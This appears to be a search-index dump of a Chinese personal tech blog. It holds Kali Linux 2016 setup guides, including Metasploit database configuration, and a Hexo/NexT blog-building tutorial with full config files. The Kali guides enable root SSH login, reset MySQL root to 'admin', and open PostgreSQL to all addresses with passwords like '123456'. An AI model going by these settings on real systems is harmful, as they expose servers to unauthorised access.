phases[m][i] – 2 * pi * baseif clear == True:breakelse:for i in range(30):phases[m][i] = tphases[m][i] – (tphases[m][29] – tphases[m][0])* 1.0 /(28 – (-28)) * (index[i])– 1.0 / 30 * sum([tphases[m][j] for j in range(30)])return phases 参考论文 PADS Passive Detection of Moving Targets with Dynamic Speed using PHY Layer Information]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[kali linux 2016 使用指南(二)]]></title>
      <url>%2F2017%2F01%2F21%2Fkali-linux-2016-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97-%E4%BA%8C%2F</url>
      <content type="text"><![CDATA[虚拟机安装增强1.Kali 官方安装更新 /etc/apt/sources.list 你所添加的源，请确保是我在一中写的所有 然后在线安装增强功能 12345apt-get updateapt-get install -y virtualbox-guest-x11reboot 2.VirtualBox自带包安装123456789apt-get update &amp;&amp; apt-get install -y linux-headers-$(uname-r)cp /media/cd-rom/VBoxLinuxAdditions.run /root/chmod 755 /root/VBoxLinuxAdditions.runcd/root./VBoxLinuxAdditions.run 内核头有问题自己手动安装过程打开 http://http.kali.org/kali/pool/main/l/linux/ 下载对应自己内核版本的 linux-kbuild 12345678910111213wget http://http.kali.org/kali/pool/main/l/linux/linux-kbuild-4.6_4.6.4-1kali1_amd64.debdpkg -i linux-kbuild-4.6_4.6.4-1kali1_amd64.debwget http://http.kali.org/kali/pool/main/l/linux/linux-headers-4.6.0-kali1-common_4.6.4-1kali1_amd64.debwget http://http.kali.org/kali/pool/main/l/linux/http://http.kali.org/kali/pool/main/l/linux/linux-headers-4.6.0-kali1-amd64_4.6.4-1kali1_amd64.debdpkg -i linux-headers-4.6.0-kali1-common_4.6.4-1kali1_amd64.debdpkg -i linux-headers-4.6.0-kali1-amd64_4.6.4-1kali1_amd64.debapt-get -f install 开启SSH服务首先：编辑sshd_config文件 1vim /etc/ssh/sshd_config 其次：将sshd_config文件中的语句PermitRootLogin prohibit-password修改为： 1PermitRootLogin yes 再次：使用命令启动SSH服务: 123/etc/init.d/ssh start# 或者service ssh start 最后：设置系统开机自动启动SSH服务: 1update-rc.d ssh enable //系统自动启动SSH服务 mysql重置密码1、如果Linux中未安装MySQL，则需要下载安装，在安装的过程中会要求输入用户名密码，则无需重置，直接设置 2、MySQL设置UTF-8编码格式** 配置文件： 1root@kali:~# vim /etc/mysql/my.cnf 添加默认utf-8编码： 123456[client]default-character-set = utf8[mysqld]default-storage-engine = INNODBcharacter-set-server = utf8collation-server = utf8_general_ci 3、更新MySQL的用户名密码 首先查看MySQL是否运行，确保MySQL是stop状态，可以使用/etc/init.d/mysql stop停止运行 12root@kali:~# /etc/init.d/mysql status[info] MySQL is stopped.. 然后启动MySQL的server/daemon process 1root@kali:~# mysqld_safe –skip-grant-tables &amp; 使用root用户连接MySQL 12345678910root@kali:~# mysql -u rootWelcome to the MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 1Server version: 5.5.44–0+deb7u1 (Debian)Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type ‘help;’ or ‘\h’ for help. Type ‘\c’ to clear the current input statement.mysql&gt; 更改root用户的密码为admin 1234567mysql&gt; use mysqlReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; update user set password=PASSWORD(‘admin’) where User=‘root’;Query OK, 4 rows affected (0.01 sec)Rows matched: 4 Changed: 4 Warnings: 0 执行更新命令 12mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec) flush privileges 命令本质上的作用是将当前user和privilige表中的用户信息/权限设置从mysql库(MySQL数据库的内置库)中提取到内存里。MySQL用户数据和权限有修改后，希望在”不重启MySQL服务”的情况下直接生效，那么就需要执行这个命令。通常是在修改ROOT帐号的设置后，怕重启后无法再登录进来，那么直接flush之后就可以看权限设置是否生效。而不必冒太大风险。 退出 1mysql&gt; quit 4、验证用户密码是否更新成功 重启MySQL 1234567root@kali:~# /etc/init.d/mysql restart[ ok ] Stopping MySQL database server: mysqld.[….] Starting MySQL database server: mysqld151015 11:41:36 mysqld_safe mysqld from pid file /var/run/mysqld/mysqld.pid ended[ .k[info] Checking for tables which need an upgrade, are corrupt or werenot closed cleanly..[1]+ 完成 mysqld_safe –skip-grant-tables 使用root用户连接MySQL 1234567891011root@kali:~# mysql -u root -pEnter password:Welcome to the MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 43Server version: 5.5.44–0+deb7u1 (Debian)Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type ‘help;’ or ‘\h’ for help. Type ‘\c’ to clear the current input statement.mysql&gt; metasploit Database not connect问题解决1、postgresql是本身没有启动的。所以需要启动。 1service postgresql start 2、通过命令进入配置 12sudo -u postgres psqlALTER USER postgres WITH PASSWORD ‘123.com’; 注意1：‘123.com’这个是密码。注意2：分号！！！！一定要带上分号“；”。注意3：\q：退出数据库 3、修改linux系统的postgres用户的密码（密码与数据库用户postgres的密码相同） 123456root@kali:~# sudo passwd -d postgrespasswd：密码过期信息已更改。root@kali:~# sudo -u postgres passwd输入新的 UNIX 密码：重新输入新的 UNIX 密码：passwd：已成功更新密码 4、修改PostgresSQL数据库配置实现远程访问 12345678root@kali:~# vi /etc/postgresql/9.4/main/postgresql.conf更改#listen_addresses = ‘localhost’为 listen_addresses = ‘*’更改#password_encryption = on为password_encryption = onroot@kali:~# vi /etc/postgresql/9.4/main/pg_hba.conf在文档末尾加上以下内容# to allow your client visiting postgresql serverhost all all 0.0.0.0 0.0.0.0 md5root@kali:~# service postgresql restart 注意1：“#”号，一定要把“#”删除掉。注意2：在vi编辑模式下点击键盘字母a是进入编辑模式，编辑完成后点击“esc”退出编辑模式然后在最下方输入“：wq”保存并退出。 5、管理PostgreSQL用户和数据库 1root@kali:~# psql -U postgres -h 127.0.0.1 用户 postgres 的口令：psql (9.4.6)SSL连接 (协议: TLSv1.2, 加密：ECDHE-RSA-AES256-GCM-SHA384，二进制位: 256, 压缩比: 关闭)输入 “help” 来获取帮助信息 1234567postgres=# create user “msf123” with password ‘123456’ nocreatedb;CREATE ROLEpostgres=# create database “msf1” with owner=”msf123”;ERROR: role “”msf123”” does not existpostgres=# create database “msf1″ with owner=”msf123”;CREATE DATABASEpostgres=# \q 注意1：还是要注意分号！！！没有分号命令就无法执行。注意2：注意复制的时候“”符号问题。注意3：user后面是用户名，password后面是用户名对应的密码。注意4：命令执行后有返回结果才是执行成功了。 6、msf配置连接 12345678root@kali:~# msfconsolemsf &gt; db_status[*] postgresql selected, no connectionmsf &gt; db_connect msf123:123456@127.0.0.1/msf1[*] Rebuilding the module cache in the background…msf &gt; db_status[*] postgresql connected to msf1msf &gt; 在msf启动后连接数据库就好。注意1：“msf123:123456”这个是步骤5中的“create user “msf123” with password ‘123456’ nocreatedb;”所建立的。“127.0.0.1”是指本机。“msf1”这个是库名。注意2：“[*] postgresql connected to msf1”这个是说明以链接成功数据库。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[kali linux 2016 使用指南(一)]]></title>
      <url>%2F2017%2F01%2F21%2Fkali-linux-2016-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97-%E4%B8%80%2F</url>
      <content type="text"><![CDATA[前言Kali Linux官方于8月30日发布Kali Linux 2016的第二个版本Kali Linux 2016.2。该版本距离Kali Linux 2016.1版本发布，已经有7个月。在这期间，在Kali Linux 2016.2版本发布的这段时间，Kali Linux官方增补了94个更新。 主要的更新大概是这个样子： Kali Linux 2016系统中的音量调整按钮归并到右上角的关闭按钮，点击关闭按钮，就可以看到音量调整滑块按钮。 使用Kali Linux 2016系统在VMWare虚拟机时，在安装增强工具open-vm-tools后，复制较大文件，会出现复制进度对话框。该对话框消失后，文件并没有出现在目标位置。这时，再次粘贴一次，就可以了。如果还是没有要复制的文件，用户可以在根目录下的/tmp/VMwareDnD中找到临时文件夹。复制的文件保存在该文件夹中。 Kali Linux 2016.2默认浏览器不再是Iceweasel，替换为FireFox ESR。该版本不会像FireFox普通版本频繁更新 ​ 关于kali使用前的一些配置，网上有很多版本，但是不是老就是很不实用。而且现在kali已经更新到了2016.2版，大多新手肯定都想安装最新版进行尝试，那么接下来我就简记一下我安装和使用过程中，对一些问题的解决。 安装具体的安装步骤就不说了，大家都懂得 可以参考：《虚拟机安装kali2.0》 不想装的，官方也提供了ova文件，可以一键导入虚拟机。 在过去的几个月里，kali官方增加了新的相关工具，修复了固定的各种bug和操作系统的改进。一些Busybox添加了HTTPS支持，现在可以设置安全的支持SSL的kali，更方便快捷的安装kali。 系统更新kali linux的更新源很重要，一定要选好，rolling的选rolling的源。 首先： 1leafpad /etc/apt/sources.list 然后复制粘贴下面的源: 1234567891011121314151617181920212223#kali官方源deb http://http.kali.org/kali kali-rolling main non-free contrib#中科大的源deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb http://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-freedeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-freedeb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-freedeb-src http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free#阿里云源deb http://mirrors.aliyun.com/kali sana main non-free contribdeb http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-freedeb-src http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free 然后更新并安装: 1apt-get update &amp;&amp; apt-get dist-upgrade 安装内核头（这个很多人都在问怎么办）我给出我的解决办法，总之还是升级内核 12$ uname -r$ 4.3.0-kali1-amd64 如果你使用我给出的源进行更新的话就会升级到4.6.0-kali1-amd64 这时候使用命令: 1apt-get install linux-headers-$(uname -r) 就可以了。 安装浏览器1.汉化火狐浏览器1apt-get install iceweasel-l10n-zh-cn 2.安装并使用chrome先下载chrome的deb安装包 执行dpkg -i google-chrome-xxx.deb你会发现报错，不用慌接下来执行 1apt–get install libappindicator1 可能还会报错，别慌，执行: 1apt-get -f install 然后安装完成，但是你会发现不能运行，原因是权限问题 我们添加一个用户: 1adduser zeroyu 然后一路回车，最后敲Y 之后按次序执行 12$ xhost +$ su zeroyu 之后敲入 google-chrome就好了 安装中文输入法个人喜欢搜狗输入法，所以再次给出搜狗输入法的安装方法 123apt-get install fcitxdpkg -i sougoupinyinXXX.debapt-get -f install 最后重启电脑就好了。（搜狗输入法安装包下载） 安装百度云宝宝的好多小秘密还藏在上面必须安装一下 依次执行： 123git clone https://github.com/LiuLang/bcloud-packagesapt-get -f installdpkg -i bcloud-x.x.x.deb 安装为知笔记到wiznote安装包下载地址找到相应的deb安装包 然后： 1dpkg –i wiznote_2.3xxxx.deb 安装shadowsocks1pip installshadowsocks–gtk 终端输入shadowsocks-gtk敲回车就可以看到ui界面了。 解决字体重叠问题这里先解决下碰到的坑 1apt–get install ttf–wqy–microhei ttf–wqy–zenhei xfonts–wqy 重启终端就好了，这个最好在安装内核头之前完成！ VPN安装1leafpad /etc/NetworkManager/NetworkManager.conf 修改最后一行的managed=false改为managed=true 然后执行下面的命令: 1234567apt–get install network–manager–openvpn–gnomeapt–get install network–manager–pptpapt–get install network–manager–pptp–gnomeapt–get install network–manager–strongswanapt–get install network–manager–vpncapt–get install network–manager–vpnc–gnome/etc/init.d/network–manager restart 1apt-get -y install network-manager-gnomemv /etc/network/interfaces /etc/network/interfaces.bak touch /etc/network/interfaces echo “auto lo” &gt; /etc/network/interfaces echo “iface lo inet loopback” &gt;&gt; /etc/network/interfaces service network-manager start docker安装12apt–get updateapt–get install docker.io Redis安装redis下载 下载完后先编译 123tar xvf redis–x.x.x.tar.gzcd redis–x.x.xmake 而后安装: 123sudo make installcd utilssudo ./install_server.sh 接下来一步一步设置就好 Mac安装后启动问题的解决其实安装跟其它都一样，就是安装后启动要等好久（当然你也可以每次启动都按下option进行选择启动） 解决方法就是 插入macOS的安装光盘，重新启动，按住option 通过光盘启动 进入安装界面 从菜单选择terminal： 1bless –device /dev/disk0 –setBoot –legacy –verbose #这里的disk0是安装grub的分区，可以通过diskutil list来进行查看 最后: 1reboot ok，这样单引导安装就完成了。 网易云音乐正确安装姿势下载网易云音乐（deepin版） 1dpkg –i 网易云.deb 注意!之后还要到/usr/share目录下的application目录找到网易云音乐，右键在命令后加一句： 1—no–sandbox 这样就ok了。 安装sun java 下载最新的JAVA JDK jdk-8u91-linux-x64 解压缩文件并移动至/opt 123tar -xzvf jdk-8u91-linux-x64.tar.gzmv jdk1.8.0_91 /optcd /opt/jdk1.8.0_91 设置环境变量 1）执行 gedit ~/.bashrc ， 并添加下列内容 1234# install JAVA JDKexport JAVA_HOME=/opt/jdk1.8.0_91export CLASSPATH=.:$&#123;JAVA_HOME&#125;/libexport PATH=$&#123;JAVA_HOME&#125;/bin:$PATH 2）执行 source ~/.bashrc 安装并注册 执行： 1234update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_91/bin/java 1update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_91/bin/javac 1update-alternatives --set java /opt/jdk1.8.0_91/bin/javaupdate-alternatives --set javac /opt/jdk1.8.0_91/bin/javac 查看结果： 12update-alternatives --config javaupdate-alternatives --config javac 5. 测试12345java -version#output java version &quot;1.8.0_91&quot;Java(TM) SE Runtime Environment (build 1.8.0_91-b14)Java HotSpot(TM) 64-Bit Server VM (build 25.91-b14, mixed mode) 解决sublime的中文输入问题 保存下述代码为 sublime-imfix.c 文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879/*sublime-imfix.cUse LD_PRELOAD to interpose some function to fix sublime input method support for linux.By Cjacker Huanggcc -shared -o libsublime-imfix.so sublime-imfix.c `pkg-config --libs --cflags gtk+-2.0` -fPICLD_PRELOAD=./libsublime-imfix.so subl*/#include &lt;gtk/gtk.h&gt;#include &lt;gdk/gdkx.h&gt;typedef GdkSegment GdkRegionBox;struct _GdkRegion&#123; long size; long numRects; GdkRegionBox *rects; GdkRegionBox extents;&#125;;GtkIMContext *local_context;voidgdk_region_get_clipbox (const GdkRegion *region, GdkRectangle *rectangle)&#123; g_return_if_fail (region != NULL); g_return_if_fail (rectangle != NULL); rectangle-&gt;x = region-&gt;extents.x1; rectangle-&gt;y = region-&gt;extents.y1; rectangle-&gt;width = region-&gt;extents.x2 - region-&gt;extents.x1; rectangle-&gt;height = region-&gt;extents.y2 - region-&gt;extents.y1; GdkRectangle rect; rect.x = rectangle-&gt;x; rect.y = rectangle-&gt;y; rect.width = 0; rect.height = rectangle-&gt;height; //The caret width is 2; //Maybe sometimes we will make a mistake, but for most of the time, it should be the caret. if(rectangle-&gt;width == 2 &amp;&amp; GTK_IS_IM_CONTEXT(local_context)) &#123; gtk_im_context_set_cursor_location(local_context, rectangle); &#125;&#125;//this is needed, for example, if you input something in file dialog and return back the edit area//context will lost, so here we set it again.static GdkFilterReturn event_filter (GdkXEvent *xevent, GdkEvent *event, gpointer im_context)&#123; XEvent *xev = (XEvent *)xevent; if(xev-&gt;type == KeyRelease &amp;&amp; GTK_IS_IM_CONTEXT(im_context)) &#123; GdkWindow * win = g_object_get_data(G_OBJECT(im_context),&quot;window&quot;); if(GDK_IS_WINDOW(win)) gtk_im_context_set_client_window(im_context, win); &#125; return GDK_FILTER_CONTINUE;&#125;void gtk_im_context_set_client_window (GtkIMContext *context, GdkWindow *window)&#123; GtkIMContextClass *klass; g_return_if_fail (GTK_IS_IM_CONTEXT (context)); klass = GTK_IM_CONTEXT_GET_CLASS (context); if (klass-&gt;set_client_window) klass-&gt;set_client_window (context, window); if(!GDK_IS_WINDOW (window)) return; g_object_set_data(G_OBJECT(context),&quot;window&quot;,window); int width = gdk_window_get_width(window); int height = gdk_window_get_height(window); if(width != 0 &amp;&amp; height !=0) &#123; gtk_im_context_focus_in(context); local_context = context; &#125; gdk_window_add_filter (window, event_filter, context);&#125; 安装 C/C++ 的编译环境和 gtk libgtk2.0-dev 12sudo apt-get install build-essentialsudo apt-get install libgtk2.0-dev 编译共享内库 1gcc -shared -o libsublime-imfix.so sublime-imfix.c `pkg-config --libs --cflags gtk+-2.0` -fPIC 设置 LD_PRELOAD 并启动 Sublime Text 1LD_PRELOAD=./libsublime-imfix.so subl 修改 /usr/share/applications/sublime_text.desktop 为 1234567891011121314[Desktop Entry][...]Exec=env LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so /opt/sublime_text/sublime_text %F[...][Desktop Action Window][...]Exec=env LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so /opt/sublime_text/sublime_text -n[...][Desktop Action Document][...]Exec=env LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so /opt/sublime_text/sublime_text --command new_file[...] 不要忘了把 libsublime-imfix.so 放到 /opt/sublime_text/ 中 修改 /usr/bin/subl 为: 123#!/bin/shexport LD_PRELOAD=/opt/sublime_text/libsublime-imfix.soexec /opt/sublime_text/sublime_text “$@” 重启电脑，可以看到Sublime能够输入中文了。 没有声音???其实并不是不支持声卡驱动了。只是root用户下默认关闭。虽然在setting的sounds里没能看到识别的声卡信息。可是其实驱动是装好的。用pulseaudio –start，就有了。 输入以下一行，就不用每次启动都要输入那行代码了。 1systemctl –user enable pulseaudio]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hexo 3.x 博客搭建指南(NEXT主题)]]></title>
      <url>%2F2017%2F01%2F21%2FHexo-3-x-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97-NEXT%E4%B8%BB%E9%A2%98%2F</url>
      <content type="text"><![CDATA[GitHub Pages 本用于介绍托管在 GitHub 的项目，也可以用来搭建博客，有300M免费空间。 hexo是一个基于Node.js的静态博客程序，可以方便的生成静态网页托管在github和Heroku上。作者是来自台湾的tommy351。优势： 生成静态页面快支持 Markdown兼容于 Windows, Mac &amp; Linux部署方便。日常使用仅需五个命令。高扩展性、自订性，文件少、小，易理解 配置SSH使用hexo博客必须配置SSH。 打开git bash，输入cd ~/.ssh，如果果提示：No such file or directory 说明未配置SSH。 本地生成密钥对ssh-keygen -t rsa -C &quot;你的邮件地址&quot;，注意命令中的大小写不要搞混。按提示指定保存文件夹，不设置密码。 添加公钥到Github 根据上一步的提示，找到公钥文件（默认为id_rsa.pub），用记事本打开，全选并复制。 登录Github，右上角 头像 -&gt; Settings —&gt; SSH keys —&gt; Add SSH key。把公钥粘贴到key中，填好title并点击 Add key。 git bash中输入命令ssh -T git@github.com，选yes，等待片刻可看到成功提示。 修改本地的ssh remote url，不用https协议，改用git协议 Github仓库中获取ssh协议相应的url 本地仓库执行命令git remote set-url origin SSH对应的url，配置完后可用git remote -v查看结果 这样git push或hexo d时不再需要输入账号密码。 搭建博客注，以下命令行需要在Git终端中执行(右键单击 -&gt; Git bash)。 安装Git：下载安装后，注册Github账号并配置Git和SSH公私钥 安装Node.js 安装hexo：npm install -g hexo，可用hexo -v查看版本。这里我用的是3.1.1。也可以指定版本：npm install hexo@3.1.1 -g 创建hexo文件夹：新建放置博客的文件夹，进入并执行命令hexo init。hexo 会在目标文件夹建立网站所需要的所有文件。 安装依赖包：npm install 创建Github Repository：Repository名字必须是你的Github名.github.io，比如我是loveNight.github.io 部署：打开博客根目录下的_config.yml文件，末尾添加如下信息。 1234deploy: type: git repository: 上一步的Github仓库地址，项目主页点SSH再复制URL branch: master 然后执行命令： 12hexo generate # 生成静态页面，可以简化为hexo ghexo deploy # 部署到Github，可以简化为hexo d 浏览器访问loveNight.github.io就能看到自己的Blog了，一般延迟十分钟左右才能看到效果。一开始看到404页面不要惊慌，耐心等等。 手打党请注意，配置文件的冒号后必须有一个空格。 如果报错 1Deployer not found:git 运行命令 1npm install hexo-deployer-git --save hexo使用生成静态页面1hexo generate 本地启动1hexo server 浏览器输入localhost:4000就可以看到效果。当你修改了文章或配置文件时，保存文件再刷新浏览器就能看到修改后的效果，非常方便。 新建文章1hexo new post &quot;title&quot; # 生成新文章：\source\_posts\title.md，可省略post 新建页面1hexo new page &quot;title&quot; post、page等可以改成其他layout，可用layout在scaffolds目录下查看。在同目录下创建文件来添加自己的layout，也可以编辑现有的layout，比如post的layout默认是\scaffolds\post.md。 编辑文章打开新建的文章\source\_posts\postName.md： 12345678910title: HelloWorld！ # 文章页面上的显示名称，可以任意修改，不会出现在URL中date: 2015-11-09 15:56:26 # 文章生成时间，一般不改categories: # 文章分类目录，参数可省略 - 随笔 - 瞬间tags: # 文章标签，参数可省略 - hexo - blog # 个数不限，单个可直接跟在tags后面---这里开始使用markdown格式输入你的正文。 多级分类语法格式：（标签也可以用类似的写法） 12345678# 第一种categories: - 一级分类 - 二级分类 - etc...# 第二种：categories: [一级分类, 二级分类] 首页文章预览添加图片： 123photos: - http://xxx.com/photo1.jpg - http://xxx.com/photo2.jpg 正文中可以使用``设置文章摘要 如下: 123以上显示在摘要中&lt;!--more--&gt;以下是余下全文 more 以上内容即是文章摘要，如果设置了主页只显示摘要，则more以下内容点击 Read More 链接打开全文才显示。 简单命令hexo现在支持更加简单的命令格式了，比如： 1234hexo g == hexo generate # 生成hexo d == hexo deploy # 部署 # 可与hexo g合并为 hexo d -ghexo s == hexo server # 本地预览hexo n == hexo new # 写文章 插入图片博客中的图片文件可以直接放在source文件夹下，部署时上传到Github仓库中。但是Github项目容量有限，而且主机在国外，访问速度较慢，把图片放在国内的图床上是个更好的选择。我用的是七牛云存储 免费用户实名审核之后，可以获取10GB永久免费存储空间、每月10GB下载流量、每月10万次Put请求、每月100万次Get请求，做图床绰绰有余。 注册账号，新建空间，我的新空间名是blog，专门用来放置博客上引用的资源。 进入空间后点击「内容管理」，再点击「上传」： 七牛空间没有文件夹的概念，但是允许为文件添加带斜杠/的前缀，用来给资源分类。这里我设置前缀为img/Hexo 3.1.1 静态博客搭建指南/。上传了一张图片,在右侧可以找到外链，复制地址： Markdown 插入图片的语法为： 1![](图片网址) 上传图片 -&gt; 获取外链 -&gt; 写入Markdown，就这么简单！ 由于七牛防盗链的白名单无法添加localhost，暂时不设置防盗链，否则hexo s调试的时候，看不到图片。 配置博客全站配置注意：文件中配置项的冒号后面必须加空格，否则报错 下面有些选项要配置后文的插件才有效，文件中已注明。 整站的配置：博客根目录下的\_config.yml文件。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132# Hexo Configuration## Docs: http://hexo.io/docs/configuration.html## Source: https://github.com/hexojs/hexo/# Sitetitle: ZEROYU # 站点名subtitle: # 副标题description: 一只单线程HACKERauthor: ZEROYU # 作者，在站点左下角可以看到#avatar: /images/avatar.jpg # 头像。Next主题增加的字段language: zh-Hans # 语言。Next主题增加的字段timezone: Asia/Shanghaisince: 2015 # 博客建立年份，Next主题增加的字段# 多说 ShortNameduoshuo_shortname: # xxx.duoshuo.com，xxx即是shortname。# Social linkssocial: Github: https://github.com/zer0yu Weibo: http://weibo.com/Z3r0yu Email: zeroyu.xyz@gmail.com # zhihu: http://www.zhihu.com/people/your-user-name# title, chinese availablelinks_title: 友情链接# linkslinks: 我的CSDN博客: http://blog.csdn.net/zeroyu_xyz# URL## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'url: http://zer0yu.github.io/ # 网址root: /permalink: :year/:month/:day/:title/permalink_defaults:# Directorysource_dir: sourcepublic_dir: publictag_dir: tagsarchive_dir: archivescategory_dir: categoriescode_dir: downloads/codei18n_dir: :lang # 国际化文件夹skip_render: # 跳过指定文件的渲染# Writing # 文章布局、写作格式的定义new_post_name: :title.md # File name of new postsdefault_layout: posttitlecase: false # Transform title into titlecaseexternal_link: true # Open external links in new tabfilename_case: 0 # 1 为小写， 2 为大写render_drafts: false # 显示草稿post_asset_folder: false # 启动asset文件夹relative_link: false # 链接改为与根目录的相对地址future: true # 显示未来的文章highlight: enable: true line_number: true auto_detect: true tab_replace:# Category &amp; Tagdefault_category: uncategorizedcategory_map:tag_map:# Date / Time format## Hexo uses Moment.js to parse and display date## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format: YYYY-MM-DDtime_format: HH:mm:ss# Pagination # 每页显示文章数## Set per_page to 0 to disable paginationper_page: 10pagination_dir: page# Extensions # 这里配置站点所用主题和插件## Plugins: http://hexo.io/plugins/plugins:baidusitemap: # 需要安装插件 npm install hexo-generator-baidu-sitemap@0.1.1 --save path: baidusitemap.xml# Extensions## Plugins: http://hexo.io/plugins/## Themes: http://hexo.io/themes/theme: nextfeed: type: atom #feed 类型 (atom/rss2) path: atom.xml #rss 路径 limit: 0 #在 rss 中最多生成的文章数(0显示所有)# 自定义站点内容搜索# 需要先安装插件：# npm install hexo-generator-search --savesearch: path: search.xml field: all # 如只想索引文章，可设置为post# Deployment # 站点部署到github## Docs: http://hexo.io/docs/deployment.htmldeploy: type: git repository: git@github.com:zer0yu/zer0yu.github.io.git branch: master# ---------------下面选项需要对应插件的支持---------------# npm install hexo-generator-index --save# npm install hexo-generator-archive --save# npm install hexo-generator-category --save# npm install hexo-generator-tag --saveindex_generator: per_page: 10 ##首页默认10篇文章标题 如果值为0不分页archive_generator: per_page: 20 ##归档页面默认20篇文章标题 yearly: true ##生成年视图 monthly: true ##生成月视图tag_generator: per_page: 10 ##标签分类页面默认10篇文章category_generator: per_page: 10 ###分类页面默认10篇文章 更换主题默认主题太丑，换成NexT主题。 安装：在博客根目录下执行git clone https://github.com/iissnan/hexo-theme-next.git themes/next。 启用：修改博客根目录下的_config.yml配置文件中的theme属性，将其设置为next。 更新：在themes/next目录下执行git pull。（暂时不需要） \themes\next\_config.yml修改主题配置。 我的_config.yml文件： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484# ---------------------------------------------------------------# Site Information Settings# ---------------------------------------------------------------# Put your favicon.ico into `hexo-site/source/` directory.favicon: /favicon.ico# Set default keywords (Use a comma to separate)keywords: "ZEROYU, SEC"# Set rss to false to disable feed link.# Leave rss as empty to use site's feed link.# Set rss to specific value if you have burned your feed already.rss:# Specify the date when the site was setup#since: 2015# icon between year and author @Footerauthoricon: heart# Footer `powered-by` and `theme-info` copyrightcopyright: true# Canonical, set a canonical link tag in your hexo, you could use it for your SEO of blog.# See: https://support.google.com/webmasters/answer/139066# Tips: Before you open this tag, remeber set up your URL in hexo _config.yml ( ex. url: http://yourdomain.com )canonical: true# Change headers hierarchy on site-subtitle (will be main site description) and on all post/pages titles for better SEO-optimization.seo: false# ---------------------------------------------------------------# Menu Settings# ---------------------------------------------------------------# When running the site in a subdirectory (e.g. domain.tld/blog), remove the leading slash (/archives -&gt; archives)menu: home: / categories: /categories about: /about archives: /archives tags: /tags #sitemap: /sitemap.xml #commonweal: /404.html# Enable/Disable menu icons.# Icon Mapping:# Map a menu item to a specific FontAwesome icon name.# Key is the name of menu item and value is the name of FontAwsome icon. Key is case-senstive.# When an question mask icon presenting up means that the item has no mapping icon.menu_icons: enable: true #KeyMapsToMenuItemKey: NameOfTheIconFromFontAwesome home: home about: user categories: th schedule: calendar tags: tags archives: archive sitemap: sitemap commonweal: heartbeat# ---------------------------------------------------------------# Scheme Settings# ---------------------------------------------------------------# Schemes#scheme: Musescheme: Mist#scheme: Pisces# ---------------------------------------------------------------# Font Settings# - Find fonts on Google Fonts (https://www.google.com/fonts)# - All fonts set here will have the following styles:# light, light italic, normal, normal intalic, bold, bold italic# - Be aware that setting too much fonts will cause site running slowly# - Introduce in 5.0.1# ---------------------------------------------------------------font: enable: true # Uri of fonts host. E.g. //fonts.googleapis.com (Default) host: # Global font settings used on &lt;body&gt; element. global: # external: true will load this font family from host. external: true family: Lato # Font settings for Headlines (h1, h2, h3, h4, h5, h6) # Fallback to `global` font settings. headings: external: true family: # Font settings for posts # Fallback to `global` font settings. posts: external: true family: # Font settings for Logo # Fallback to `global` font settings. # The `size` option use `px` as unit logo: external: true family: size: # Font settings for &lt;code&gt; and code blocks. codes: external: true family: size:# ---------------------------------------------------------------# Sidebar Settings# ---------------------------------------------------------------# Social Links# Key is the link label showing to end users.# Value is the target link (E.g. GitHub: https://github.com/iissnan)#social: #LinkLabel: Link# Social Links Icons# Icon Mapping:# Map a menu item to a specific FontAwesome icon name.# Key is the name of the item and value is the name of FontAwsome icon. Key is case-senstive.# When an globe mask icon presenting up means that the item has no mapping icon.social_icons: enable: true # Icon Mappings. # KeyMapsToSocalItemKey: NameOfTheIconFromFontAwesome GitHub: github Twitter: twitter Weibo: weibo# Sidebar Avatar# in theme directory(source/images): /images/avatar.jpg# in site directory(source/uploads): /uploads/avatar.jpg#avatar:# Table Of Contents in the Sidebartoc: enable: true # Automatically add list number to toc. number: true# Creative Commons 4.0 International License.# http://creativecommons.org/# Available: by | by-nc | by-nc-nd | by-nc-sa | by-nd | by-sa | 